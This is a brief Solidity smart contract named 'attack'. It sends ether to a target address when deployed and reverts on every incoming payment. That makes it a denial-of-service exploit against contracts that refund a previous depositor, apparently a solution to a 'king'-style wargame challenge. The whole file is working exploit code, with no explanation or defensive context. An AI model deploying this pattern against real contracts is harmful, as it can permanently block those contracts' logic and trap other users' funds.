pragma solidity ^0.6.0;

contract attack{
    constructor(address _addr) public payable{
        _addr.call{value : msg.value}("");
    }
    receive() external payable{
        revert();
    }
}